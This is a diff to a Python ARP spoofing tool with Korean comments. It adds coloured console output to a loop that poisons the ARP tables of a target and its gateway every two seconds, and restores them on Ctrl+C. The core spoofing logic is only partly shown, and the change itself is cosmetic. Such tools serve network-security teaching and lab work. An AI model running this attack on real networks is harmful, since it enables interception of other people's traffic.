@@ -10,19 +10,21 @@ class ArpSpoofing :
     
     # arpSoofing을 시작한다.
     def startArpSpoofing(self) :
+        g = '\033[92m'
+        e = '\033[0m'
         count=0
         try : 
             while True :
                 self._spoof(self._interface, self._targetIp, self._gatewayIp)
                 self._spoof(self._interface, self._gatewayIp, self._targetIp)
                 count+=1
-                print("[*] " + str(count) + "번째 ARP Spoofing (종료후 다시 복구할려면 Ctrl+C 입력)")
+                print(g+"[*] " + str(count) + "번째 ARP Spoofing (종료후 다시 복구할려면 Ctrl+C 입력)"+e)
                 time.sleep(2)
         except KeyboardInterrupt :
-            print("[*] Ctrl+C가 감지됨. ARP 테이블을 다시 복구중...")
+            print(g+"[*] Ctrl+C가 감지됨. ARP 테이블을 다시 복구중..."+e)
             self._restore(self._interface, self._targetIp, self._gatewayIp)
             self._restore(self._interface, self._gatewayIp, self._targetIp)
-            print("[*] 복구가 완료됨 !")
+            print(g+"[*] 복구가 완료됨 !"+e)
 
     # targetIp에게 SpoofIp로 자신을 속인다.    
     def _spoof(self, interface, targetIp, spoofIp) :
@@ -38,10 +40,12 @@ class ArpSpoofing :
 
     # 특정 Ip주소의 Mac주소를 얻는다.
     def _getMacAddress(self, interface, ipAddress) :
+        f = '\033[91m'
+        e = '\033[0m'
         while(True) :
             ans, uans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ipAddress), timeout=2, iface=interface, verbose=False)
             if(len(ans)) : break
-            else : print("[!] "+ipAddress+"에 대한 MAC 주소를 얻지못했습니다. 잠시후 다시 시도됩니다.")
+            else : print(f+"[!] "+ipAddress+"에 대한 MAC 주소를 얻지못했습니다. 잠시후 다시 시도됩니다."+e)
         return ans[0][1].hwsrc
 
 # 도움말을 출력한다.
